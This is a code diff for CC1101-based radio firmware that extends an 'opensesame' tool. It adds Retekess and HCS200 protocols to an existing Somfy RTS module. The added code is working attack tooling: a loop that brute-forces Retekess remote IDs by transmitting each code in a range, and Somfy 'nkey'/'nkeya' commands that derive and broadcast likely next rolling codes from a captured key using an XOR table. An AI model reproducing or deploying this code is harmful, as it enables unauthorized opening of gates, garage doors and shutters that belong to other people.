@@ -17,6 +17,8 @@
 //------------------------------------------------------------------------------------------------------------------
 #include "env.h"
 //------------------------------------------------------------------------------------------------------------------
+#include "OS_HCS200.h"
+//------------------------------------------------------------------------------------------------------------------
 CmdStatus_e open_sesame_main(void* parent,int argc, char* argv[]);
 CmdStatus_e open_sesame_somfy(void* parent,int argc, char* argv[]);
 CmdStatus_e open_sesame_somfy_help(void* parent,int argc, char* argv[]);
@@ -31,7 +33,14 @@ CmdStatus_e open_sesame_somfy_process(void* parent,int argc, char* argv[]);
 CmdStatus_e open_sesame_somfy_cont(void* parent,int argc, char* argv[]);
 CmdStatus_e open_sesame_somfy_smaxt(void* parent,int argc, char* argv[]);
 CmdStatus_e open_sesame_somfy_srssi(void* parent,int argc, char* argv[]);
+CmdStatus_e open_sesame_somfy_nextkey(void* parent,int argc, char* argv[]);
+CmdStatus_e open_sesame_somfy_nextkeya(void* parent,int argc, char* argv[]);
+//------------------------------------------------------------------------------------------------------------------
 CmdHandler* getRootCommandHandler(void);
+
+//------------------------------------------------------------------------------------------------------------------
+CmdStatus_e open_sesame_retk(void* parent,int argc, char* argv[]);
+CmdStatus_e open_sesame_retk_help(void* parent,int argc, char* argv[]);
 //------------------------------------------------------------------------------------------------------------------
 CC1101* getRadio(void);
 #if USE_FILE_SYSTEM == 1
@@ -40,7 +49,9 @@ CmdStatus_e files_readenv(void* parent,int argc, char* argv[]);
 #endif
 //------------------------------------------------------------------------------------------------------------------
 extern SomfyRTSProtocol somfy;
-Protocol* osprots[] = { &somfy };
+extern RetekessProtocol retk;
+extern HCS200Protocol hcs200;
+Protocol* osprots[] = { &somfy, &retk, &hcs200 };
 //------------------------------------------------------------------------------------------------------------------
 typedef struct SomfyBruteContext_s
 {
@@ -59,12 +70,15 @@ typedef struct SomfyBruteContext_s
 } SomfyBruteContext_t;
 //------------------------------------------------------------------------------------------------------------------
 SomfyBruteContext_t somfy_ctx;
+uint32_t next_key_xor_table[13] = { 0x00000000, 0x00018180, 0x00028280, 0x00048480, 0x00088880, 0x00090900, 0x00050500, 0x000F0F00, 0x000E8E80, 0x000C0C00, 0x00060600, 0x00078780, 0x00030300 };
 //------------------------------------------------------------------------------------------------------------------
 cmd_handler_t open_sesame_handler = { &open_sesame_main, NULL, NULL, "opensesame", "Open sesame for various radio protocols, use: 'opensesame help'", 0, "", "opensesame help" };
 //------------------------------------------------------------------------------------------------------------------
 cmd_handler_t open_sesame_sub_cmd[] = {
    { &open_sesame_main,      &open_sesame_handler,   NULL, "help",  "this help", 0, "", "opensesame help"},
    { &open_sesame_somfy,     &open_sesame_handler,   NULL, "somfy",  "somfy iterated frames flood", 0, "", "opensesame somfy help"},
+   { &open_sesame_retk,      &open_sesame_handler,   NULL, "retekess",  "retekes iterated id flood", 0, "", "opensesame retekes help"},
+   { &open_sesame_hcs200,    &open_sesame_handler,   NULL, "hcs200",  "hcs200 iterated enccode flood", 0, "", "opensesame hcs200 help"},
    { 0,  0, NULL, "",  "", 0, "","" }
 };
 //------------------------------------------------------------------------------------------------------------------
@@ -83,12 +97,22 @@ cmd_handler_t open_sesame_somfy_sub_cmd[] = {
    { &open_sesame_somfy_srssi,     &open_sesame_handler, NULL, "srssi", "set min rssi for channel monitoring: rssi<signed int> use<int> 0 - 1, wait millis <int>", 3, "isi", "opensesame somfy srrsi 1<int> -60 <int> 2000<int>"},
    { &open_sesame_somfy_process  , &open_sesame_handler, NULL, "brute", "brute iteration of codes, display interval<int>", 1, "i", "opensesame somfy brute 10000<int ms>"},   
    { &open_sesame_somfy_cont     , &open_sesame_handler, NULL, "brutc", "set continuation flag<int> 0-1, ", 1, "i", "opensesame somfy brutc 1<int>"},
+   { &open_sesame_somfy_nextkey  , &open_sesame_handler, NULL, "nkey", "transmit next key offset<int>1-6, rpetitions<int> ", 2, "ii", "opensesame somfy nkey 1<int> 2<int>"},
+   { &open_sesame_somfy_nextkeya , &open_sesame_handler, NULL, "nkeya", "transmit few next keys, rpetitions<int> ", 1, "i", "opensesame somfy nkeya 2<int>"},
    { 0,  0, NULL, "",  "", 0, "","" }
+};
+//------------------------------------------------------------------------------------------------------------------
+cmd_handler_t open_sesame_retk_sub_cmd[] = {
+  { &open_sesame_retk_help,      &open_sesame_handler, NULL, "help", "this help", 0, "", "opensesame retekess help" },
+  { &open_sesame_retk_process  , &open_sesame_handler, NULL, "brute", "brute iteration of codes, id1<hex>, id2_start<hex, id2_end<hedx> >display interval<int>", 4, "xxxi", "opensesame retekess brute 032 001 fff 10000<int ms>"},   
+  { 0,  0, NULL, "",  "", 0, "","" }  
 };
 //------------------------------------------------------------------------------------------------------------------
 void opensesame_cmd_init(void)
 { 
   open_sesame_sub_cmd[1].sub_cmd = open_sesame_somfy_sub_cmd;
+  open_sesame_sub_cmd[2].sub_cmd = open_sesame_retk_sub_cmd;
+  open_sesame_sub_cmd[3].sub_cmd = open_sesame_hcs200_sub_cmd;
   getRootCommandHandler()->registerHandler(&open_sesame_handler, open_sesame_sub_cmd); 
   somfy_ctx.c0 = 0x09800000;
   somfy_ctx.c1 = 0x00000000;
@@ -142,9 +166,31 @@ CmdStatus_e open_sesame_somfy(void* parent,int argc, char* argv[])
      return COMMAND_NOT_FOUND;
 }
 //------------------------------------------------------------------------------------------------------------------
+CmdStatus_e open_sesame_retk(void* parent,int argc, char* argv[])
+{
+     int idx = 0 ;
+     cmd_handler_t* item = &open_sesame_retk_sub_cmd[idx];
+
+     if (argc < 3)
+        return open_sesame_retk_help(parent, argc, argv);
+     
+     while (item && item->handler != 0)
+     {
+            if (String(argv[2]) == item->cmd)
+            {
+                return item->handler(getRootCommandHandler(), argc, argv);
+            }
+            idx++;
+            item = &open_sesame_retk_sub_cmd[idx];
+      
+     }
+    
+     return COMMAND_NOT_FOUND;
+}
+//------------------------------------------------------------------------------------------------------------------
 CmdStatus_e open_sesame_somfy_help(void* parent,int argc, char* argv[])
 {
-     STDOUT.println(open_sesame_sub_cmd[2].desc);
+     STDOUT.println(open_sesame_sub_cmd[1].desc);
 
      int idx = 0 ;
      cmd_handler_t* item = &open_sesame_somfy_sub_cmd[idx];
@@ -157,6 +203,27 @@ CmdStatus_e open_sesame_somfy_help(void* parent,int argc, char* argv[])
 
             idx++;
             item = &open_sesame_somfy_sub_cmd[idx];
+      
+     }
+    
+     return OK;
+}
+//------------------------------------------------------------------------------------------------------------------
+CmdStatus_e open_sesame_retk_help(void* parent,int argc, char* argv[])
+{
+     STDOUT.println(open_sesame_sub_cmd[2].desc);
+
+     int idx = 0 ;
+     cmd_handler_t* item = &open_sesame_retk_sub_cmd[idx];
+     while (item && item->handler != 0)
+     {
+            STDOUT.print("- ");
+            STDOUT.print(item->cmd);
+            STDOUT.print( " : ");
+            STDOUT.println( item->desc);
+
+            idx++;
+            item = &open_sesame_retk_sub_cmd[idx];
       
      }
     
@@ -310,6 +377,18 @@ String open_sesame_somfy_ctx_describe(uint32_t c0, uint32_t c1, uint32_t c2, str
      sprintf(buffer, "cnt:%08x%08x c0: %08x c1: %08x c2: %08x ts:%s prog: %d", 
         (uint32_t)(ctx.curr >> 32) & 0xffffffff, (uint32_t)(ctx.curr) & 0xffffffff,
         c0, c1, c2, millis_to_time(millis() - startMs).c_str(), progress);
+
+     return String(buffer);
+    
+}
+//------------------------------------------------------------------------------------------------------------------
+String open_sesame_retk_describe(uint32_t id1, uint32_t id2s, uint32_t id2e, uint32_t id2curr, uint32_t startMs)
+{
+     char buffer[128];
+     int progress = ((100 * id2curr)/ id2e);
+     sprintf(buffer, "cnt:%04x%03x id1: %04x id2: %03x ts:%s prog: %d", 
+        (uint32_t)(id1) & 0x1fff, (uint32_t)(id2curr) & 0xfff,
+        id1, id2curr, millis_to_time(millis() - startMs).c_str(), progress);
 
      return String(buffer);
     
@@ -489,9 +568,9 @@ CmdStatus_e open_sesame_somfy_process(void* parent,int argc, char* argv[])
 
        somfy_ctx.curr++;
        #if USE_FILE_SYSTEM == 1
-       if (somfy_ctx.curr  > 0) && somfy_ctx.curr % OS_ITERATION_FILE_AUTO_DUMP == 0)
+       if (somfy_ctx.curr  > 0 && (somfy_ctx.curr % OS_ITERATION_FILE_AUTO_DUMP == 0))
            open_sesame_somfy_store_env_counter(somfy_ctx.curr);
-       if (somfy_ctx.curr  > 0 && somfy_ctx.curr % (4 * OS_ITERATION_FILE_AUTO_DUMP) == 0)
+       if (somfy_ctx.curr  > 0 && (somfy_ctx.curr % (4 * OS_ITERATION_FILE_AUTO_DUMP) == 0))
            open_sesame_somfy_store_file_counter(somfy_ctx.curr);
        #endif
 
@@ -537,5 +616,208 @@ CmdStatus_e open_sesame_somfy_cont(void* parent,int argc, char* argv[])
    somfy_ctx.cont = cont ? true : false;
 
    return OK;
+}
+//------------------------------------------------------------------------------------------------------------------
+CmdStatus_e open_sesame_somfy_nextkey(void* parent,int argc, char* argv[])
+{
+   int koff = atoi(argv[3]);
+   int rep = atoi(argv[4]);
+   int pulses;  
+   int p;
+   
+   if (koff < 0 || koff > 6)
+   {
+       getRootCommandHandler()->setResultMessage("wrong key offset: 0 - 6");
+       return WRONG_PARAMS;
+   }
+   if (rep < 0 || rep > 13)
+   {
+       getRootCommandHandler()->setResultMessage("wrong repetition count: 0 - 13");
+       return WRONG_PARAMS;
+   }
+
+    if (somfy_ctx.c0 == 0 || somfy_ctx.c1 == 0 || somfy_ctx.c2 == 0)
+    {
+         getRootCommandHandler()->setResultMessage("check c0 - c2 codes, use scod");
+         return WRONG_PARAMS;
+    }
+    uint32_t c0 = somfy_ctx.c0 ^ next_key_xor_table[koff];
+
+    STDOUT.print("next key\n\r");
+    STDOUT.print("proto:");
+    STDOUT.print(somfy.getName().c_str());
+    STDOUT.print(" c0:");print_hex_uint32(STDOUT, somfy_ctx.c0);
+    STDOUT.print(" c1:");print_hex_uint32(STDOUT, somfy_ctx.c1);
+    STDOUT.print(" c2:");print_hex_uint32(STDOUT, somfy_ctx.c2);
+    STDOUT.print("\n\r");
+    STDOUT.print("target key:");
+    STDOUT.print(" c0:");print_hex_uint32(STDOUT, c0);
+    STDOUT.print(" c1:");print_hex_uint32(STDOUT, somfy_ctx.c1);
+    STDOUT.print(" c2:");print_hex_uint32(STDOUT, somfy_ctx.c2);
+    STDOUT.print("\n\r");
+    STDOUT.print("--repeating ");
+    STDOUT.print(rep);
+    STDOUT.print(" times\n\r");
+    somfy.setCodes(c0, somfy_ctx.c1, somfy_ctx.c2);
+    radio_pulses_flush();
+    pulses = 0;
+    
+    for (int r = 0; r < rep; r++)
+    {
+       somfy.toPulses(radio_pulses_get_pulses(), radio_pulses_max_count(), &p, r);       
+       pulses += p;
+    }
+    radio_pulses_send(0, pulses);
+    
+   return OK;
+}
+//------------------------------------------------------------------------------------------------------------------
+CmdStatus_e open_sesame_somfy_nextkeya(void* parent,int argc, char* argv[])
+{
+   int rep = atoi(argv[3]);
+   int pulses;  
+   int p;
+   
+   if (rep < 0 || rep > 12)
+   {
+       getRootCommandHandler()->setResultMessage("wrong repetition count: 0 - 12");
+       return WRONG_PARAMS;
+   }
+
+    if (somfy_ctx.c0 == 0 || somfy_ctx.c1 == 0 || somfy_ctx.c2 == 0)
+    {
+         getRootCommandHandler()->setResultMessage("check c0 - c2 codes, use scod");
+         return WRONG_PARAMS;
+    }
+   
+
+    STDOUT.print("next key\n\r");
+    STDOUT.print("proto:");
+    STDOUT.print(somfy.getName().c_str());
+    STDOUT.print(" c0:");print_hex_uint32(STDOUT, somfy_ctx.c0);
+    STDOUT.print(" c1:");print_hex_uint32(STDOUT, somfy_ctx.c1);
+    STDOUT.print(" c2:");print_hex_uint32(STDOUT, somfy_ctx.c2);
+    STDOUT.print("\n\r");
+
+
+    for (int koff = 1; koff < 13; koff++)
+    {
+        uint32_t c0 = somfy_ctx.c0 ^ next_key_xor_table[koff];
+        somfy.setCodes(c0, somfy_ctx.c1, somfy_ctx.c2);
+        radio_pulses_flush();
+        pulses = 0;
+
+        STDOUT.print("target key[");STDOUT.print(koff);STDOUT.print("]");
+        STDOUT.print(" c0:");print_hex_uint32(STDOUT, c0);
+        STDOUT.print(" c1:");print_hex_uint32(STDOUT, somfy_ctx.c1);
+        STDOUT.print(" c2:");print_hex_uint32(STDOUT, somfy_ctx.c2);
+        STDOUT.print(" -rep ");
+        STDOUT.print(rep);
+        STDOUT.print(" times\n\r");
+
+        
+        for (int r = 0; r < rep; r++)
+        {
+           somfy.toPulses(radio_pulses_get_pulses(), radio_pulses_max_count(), &p, r);       
+           pulses += p;
+        }
+        radio_pulses_send(0, pulses);
+        delayMicroseconds(4 * somfy.getInterFrameTime());
+    }
+    
+   return OK;
+}
+
+//------------------------------------------------------------------------------------------------------------------
+CmdStatus_e open_sesame_retk_process(void* parent,int argc, char* argv[])
+{
+
+   uint32_t id1 = strtoul(argv[3], 0, 16);
+   uint32_t id2s = strtoul(argv[4], 0, 16);      
+   uint32_t id2e = strtoul(argv[5], 0, 16);    
+   uint32_t disp = atoi(argv[6]);
+   uint32_t curr;
+     
+    
+    bool cont = true;
+    String msg;
+    int pulses;
+    int p;
+    int opsec;
+
+
+    if (id1 == 0 || id2e == 0)
+       return WRONG_PARAMS;
+
+    if (id2e < id2s)
+       return WRONG_PARAMS;
+    
+    if (disp == 0 || disp < 2000 || disp > 360000)
+    {
+         getRootCommandHandler()->setResultMessage("wrong display period");
+         return WRONG_PARAMS;
+    }
+    
+    
+    STDOUT.print("brute start\n\r");
+    STDOUT.print("proto:");
+    STDOUT.print(retk.getName().c_str());
+    STDOUT.print(" id1:");print_hex_uint32(STDOUT, id1);
+    STDOUT.print(" id2 start:");print_hex_uint32(STDOUT, id2s);
+    STDOUT.print(" id2 end:") ;print_hex_uint32(STDOUT, id2e);
+    STDOUT.print("\n\r");
+    STDOUT.println(" press ctrl-c/f/d to terminate...");
+
+    uint32_t startMs = millis();
+    uint32_t s = startMs;
+    
+
+    curr = id2s;
+    
+    while(curr <= id2e && cont)
+    {
+       uint64_t v;
+       
+       retk.setData(id1 << 12 | curr);
+
+       radio_pulses_flush();
+
+
+       pulses = 0;
+       retk.toPulses(radio_pulses_get_pulses(), radio_pulses_max_count(), &p, 0);       
+       pulses += p;
+       retk.toPulses(&radio_pulses_get_pulses()[pulses], radio_pulses_max_count() - pulses, &p, 1);
+       pulses += p;
+       
+       radio_pulses_send(0, pulses);
+       
+       if (millis() -s > disp)
+       {
+           msg = "brut tx:" + open_sesame_retk_describe(id1, id2s, id2e, curr, startMs);
+           STDOUT.print(msg); STDOUT.print("\n\r");
+           s = millis();
+       }
+
+       curr++;
+
+       opsec = (millis() - startMs) / 1000;
+          
+       if (STDIN.available() > 0 && cont)
+       {
+          byte c = STDIN.read();
+          
+          if (c == CTRL_C || c == CTRL_F || c == CTRL_D)
+          {
+              cont = false;
+              continue;
+          }
+       }
+    }
+    msg = "brut last tx:" + open_sesame_retk_describe(id1,id2s,id2e,curr, startMs);
+    STDOUT.print(msg); STDOUT.print("\n\r");
+    STDOUT.print("brute stop\n\r");
+    
+
+    return CmdStatus_e::OK;
 }
 //------------------------------------------------------------------------------------------------------------------
